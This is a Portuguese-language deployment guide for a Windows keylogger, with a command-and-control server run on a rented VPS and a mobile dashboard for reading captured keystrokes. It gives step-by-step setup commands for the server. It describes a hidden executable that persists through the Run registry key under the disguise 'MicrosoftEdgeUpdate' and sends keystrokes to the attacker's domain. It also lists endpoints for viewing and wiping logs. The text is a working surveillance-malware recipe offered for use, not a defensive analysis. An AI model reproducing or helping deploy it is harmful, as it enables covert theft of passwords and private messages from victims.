# Keylogger + Painel Mobile — Guia de Deploy

## Arquivos incluídos

| Arquivo | Função |
|---|---|
| `keylogger.cpp` | Cliente Windows (hook + exfil) |
| `keylogger.vcxproj` | Projeto MSVC para compilar |
| `server.py` | Servidor C2 (rodar no VPS) |
| `dashboard.html` | Painel mobile (abrir no celular) |

---

## PASSO 1 — Configurar um VPS

Precisa de um servidor Linux acessível pela internet.
Opções baratas: Oracle Cloud Free Tier, Hetzner (~€4/mês), DigitalOcean.

```bash
# No VPS (Ubuntu 22.04):
sudo apt update && sudo apt install python3-pip nginx certbot python3-certbot-nginx -y
pip3 install flask gunicorn

# Copiar server.py para o VPS (via scp ou painel do provedor)
scp server.py usuario@SEU-IP:/home/usuario/

# Rodar servidor
cd /home/usuario
gunicorn -w 2 -b 127.0.0.1:5000 server:app --daemon
```

### Configurar domínio + HTTPS (necessário para WinHTTP funcionar sem flags)

1. Aponte um domínio (ou subdomínio) para o IP do VPS no DNS
2. `sudo certbot --nginx -d seu-dominio.com`
3. Configure nginx como proxy reverso:

```nginx
# /etc/nginx/sites-available/c2
server {
    listen 443 ssl;
    server_name seu-dominio.com;
    # certbot preencheu ssl_certificate aqui

    location / {
        proxy_pass http://127.0.0.1:5000;
        proxy_set_header X-Forwarded-For $remote_addr;
    }
}
```
```bash
sudo nginx -t && sudo systemctl reload nginx
```

---

## PASSO 2 — Configurar e compilar o keylogger

### Editar keylogger.cpp (duas linhas no topo):
```cpp
#define C2_HOST  L"seu-dominio.com"   // ← seu domínio
#define C2_PORT  443
```

### Compilar com Visual Studio 2022:
1. Abra `keylogger.vcxproj` no Visual Studio
2. Selecione `Release | x64`
3. `Build → Build Solution`
4. O `.exe` fica em `x64/Release/keylogger.exe`

**Sem janela:** o projeto já usa `/SUBSYSTEM:WINDOWS`, nenhuma janela aparece.

### Executar no seu Windows:
Basta dar duplo clique no `.exe`. Ele:
- Registra a si mesmo em `HKCU\...\Run` como `MicrosoftEdgeUpdate`
- Sobrevive ao reboot
- Não aparece na barra de tarefas nem no Alt+Tab

---

## PASSO 3 — Acessar pelo celular

### Opção A — Abrir dashboard.html direto no celular

1. Edite `dashboard.html`, linha 3 do script:
   ```js
   const C2    = "https://seu-dominio.com";
   const TOKEN = "meutoken123";   // igual ao VIEW_TOKEN no server.py
   ```
2. Envie o arquivo para o celular (WhatsApp, Drive, e-mail)
3. Abra no browser do celular — funciona offline (HTML local), puxa dados do servidor

### Opção B — Acessar direto pela URL

Abra no celular:
```
https://seu-dominio.com/view?t=meutoken123
```
Retorna JSON com todos os logs.

### Trocar o token (recomendado):
- Em `server.py`: `VIEW_TOKEN = "seu-token-secreto"`
- Em `dashboard.html`: `const TOKEN = "seu-token-secreto"`
- Reiniciar o gunicorn após mudar o server.py

---

## Referência rápida de endpoints

| Endpoint | Método | Função |
|---|---|---|
| `/log` | POST | recebe keystrokes (cliente Windows) |
| `/view?t=TOKEN` | GET | retorna JSON com logs |
| `/clear` | POST (form: t=TOKEN) | apaga todos os logs |

---

## Verificar se está rodando

No VPS:
```bash
# ver processos
ps aux | grep gunicorn

# ver logs chegando em tempo real
watch -n2 'sqlite3 logs.db "SELECT * FROM kl ORDER BY id DESC LIMIT 5"'
```
